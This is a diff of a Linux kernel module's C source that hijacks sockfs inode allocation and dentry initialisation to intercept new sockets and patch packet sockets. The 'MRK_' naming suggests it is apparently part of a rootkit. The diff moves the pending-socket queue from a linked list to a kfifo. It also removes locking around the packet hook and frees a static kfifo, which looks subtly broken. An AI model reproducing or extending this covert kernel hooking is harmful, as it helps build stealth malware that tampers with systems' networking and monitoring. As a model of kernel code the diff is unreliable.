@@ -3,7 +3,7 @@
 #include <net/sock.h>
 #include <linux/workqueue.h>
 #include <linux/fs.h>
-#include <linux/list.h>
+#include <linux/kfifo.h>
 
 #include "headers/networking.h"
 
@@ -12,33 +12,29 @@
 #include "socket/hook.h"
 
 int hooked_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
-    unsigned long _flags;
     struct socket *sock = (struct socket *)wq_entry->private;
     
     if (is_packet_sock(sock)) {
-        spin_lock_irqsave(&hook_packet_lock, _flags);
         hook_packet_sock(sock);
-	    spin_unlock_irqrestore(&hook_packet_lock, _flags);
     } else {
         list_del_init(&wq_entry->entry);
     }
     return 0;
 }
 
-struct unhooked_socket_entry {
-    struct list_head head;
-    struct socket *sock;
-};
+#define FIFO_SIZE 32
 
-static LIST_HEAD(unhooked_sockets);
+static DECLARE_KFIFO(unhooked_sockets, struct socket *, FIFO_SIZE);
+static DEFINE_SPINLOCK(read_lock);
+static DEFINE_SPINLOCK(write_lock);
 
 static struct inode *(*original_alloc_inode)(struct super_block *sb);
 
 static struct inode *hooked_alloc_inode(struct super_block *sb) {
     struct inode *res;
     struct socket *sock;
+    unsigned long flags;
     struct wait_queue_entry *wq;
-    struct unhooked_socket_entry *s_entry;
 
     res = original_alloc_inode(sb);
     sock = SOCKET_I(res);
@@ -50,35 +46,31 @@ static struct inode *hooked_alloc_inode(struct super_block *sb) {
     add_wait_queue(&sock->wq.wait, wq);
 
     /* Add to unhooked queue */
-    s_entry = kmalloc(sizeof(struct unhooked_socket_entry), GFP_KERNEL);
-    s_entry->sock = sock;
-    list_add_tail(&s_entry->head, &unhooked_sockets);
-
+    spin_lock_irqsave(&write_lock, flags);
+    kfifo_put(&unhooked_sockets, sock);
+    spin_unlock_irqrestore(&write_lock, flags);
     return res;
 }
 
-static DEFINE_SPINLOCK(unhooked_sockets_lock);
 
 static int hooked_d_init(struct dentry *dentry)
 {
-    struct unhooked_socket_entry *s_entry;
-    struct unhooked_socket_entry *temp;
+    struct socket *sock;
     unsigned long flags;
-    unsigned long flags2;
+    int res;
 
     /* Handle unhooked queue */
-    spin_lock_irqsave(&unhooked_sockets_lock, flags2);
-	list_for_each_entry_safe(s_entry, temp, &unhooked_sockets, head) {
+    while (!kfifo_is_empty(&unhooked_sockets)) {
+        spin_lock_irqsave(&read_lock, flags);
+        res = kfifo_get(&unhooked_sockets, &sock);
+        spin_unlock_irqrestore(&read_lock, flags);
+        if (!res) break;
+
         // TODO: Only do this if the socket is ready to patch (it has ops and recv function.)
-        spin_lock_irqsave(&hook_packet_lock, flags);
-        if (is_packet_sock(s_entry->sock)) {
-            hook_packet_sock(s_entry->sock);
+        if (is_packet_sock(sock)) {
+            hook_packet_sock(sock);
         }
-        list_del(&s_entry->head);
-        kfree(s_entry);
-        spin_unlock_irqrestore(&hook_packet_lock, flags);
-    }
-    spin_unlock_irqrestore(&unhooked_sockets_lock, flags2);
+    }	
 	return 0;
 }
 
@@ -89,6 +81,7 @@ int MRK_init_sockets_hook(void) {
     struct dentry_operations *s_d_op;
 
     hook_init();
+    INIT_KFIFO(unhooked_sockets);
 
     fs_type = get_fs_type("sockfs");
 
@@ -109,4 +102,5 @@ int MRK_init_sockets_hook(void) {
 }
 
 void MRK_exit_sockets_hook(void) {
+    kfifo_free(&unhooked_sockets);
 }
